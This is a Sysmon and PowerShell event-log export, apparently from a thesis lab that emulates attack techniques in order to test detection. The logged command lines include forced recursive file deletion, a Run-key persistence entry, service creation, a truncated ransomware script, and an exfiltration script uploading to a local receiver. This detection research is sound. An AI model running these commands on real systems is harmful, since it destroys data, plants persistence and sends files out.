2026-06-24T12:53:28.557Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P2	TEC-008	T1485 context		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.325Z	P2	TEC-008	T1485 context		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "SetValue", "UtcTime": "2026-06-24 12:51:33.974", "ProcessGuid": "6BC49A7D-D2D5-6A3B-D768-000000009801", "ProcessId": 10524, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "Details": "C:\\Windows\\System32\\calc.exe", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	13	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "DeleteValue", "UtcTime": "2026-06-24 12:51:38.827", "ProcessGuid": "6BC49A7D-D2DA-6A3B-DB68-000000009801", "ProcessId": 13440, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	12	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "SetValue", "UtcTime": "2026-06-24 12:51:33.974", "ProcessGuid": "6BC49A7D-D2D5-6A3B-D768-000000009801", "ProcessId": 10524, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "Details": "C:\\Windows\\System32\\calc.exe", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	13	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "DeleteValue", "UtcTime": "2026-06-24 12:51:38.827", "ProcessGuid": "6BC49A7D-D2DA-6A3B-DB68-000000009801", "ProcessId": 13440, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	12	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:08.286Z	P2	TEC-004	T1547.001 context		Forensic_EVENT_Sysmon_Registry_File_Network_Context		Microsoft-Windows-Sysmon/Operational	{ "RuleName": "T1060,RunKey", "EventType": "DeleteValue", "UtcTime": "2026-06-24 12:51:38.827", "ProcessGuid": "6BC49A7D-D2DA-6A3B-DB68-000000009801", "ProcessId": 13440, "Image": "C:\\Windows\\system32\\reg.exe", "TargetObject": "HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test", "User": "LT29\\seguridad" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	12	Sysmon Registry	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_Registry_File_Network_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P2	TEC-005	T1569.002		Forensic_EVENT_System_7045_ServiceCreation	LT29.ait.us.es	System	{ "ServiceName": "TFM TEC005 Test Service", "ImagePath": "C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt", "ServiceType": "servicio de modo usuario", "StartType": "inicio por solicitud", "AccountName": "LocalSystem" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_System_7045_ServiceCreation-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:55.524Z	P1	TEC-007	T1486	TEC-007 critical encryption behavior	P1_EVENT_PowerShell4104_Basic	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$WorkDir = "", [string]$ListFile = "", [string]$PasswordFile = "", [int]$MaxFiles = 25 ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($WorkDir)) { $WorkDir = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($ListFile)) { $ListFile = Join-Path $PSScriptRoot "lista_archivos.csv" } if ([string]::IsNullOrWhiteSpace($PasswordFile)) { $PasswordFile = Join-Path $PSScriptRoot "password.txt" } if (-not (Test-Path -LiteralPath $WorkDir)) { throw "WorkDir does not exist: $WorkDir" } if (-not (Test-Path -LiteralPath $ListFile)) { throw "ListFile does not exist: $ListFile" } if (-not (Test-Path -LiteralPath $PasswordFile)) { Set-Content -Litera...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_PowerShell4104_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:42.608Z	P1	TEC-008	T1485	TEC-008 critical destructive deletion behavior	P1_EVENT_PowerShell4104_Basic	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_PowerShell4104_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P1	TEC-004	T1547.001	TEC-004 high-confidence Run Key persistence	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P1	TEC-005	T1569.002	TEC-005 suspicious service command	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
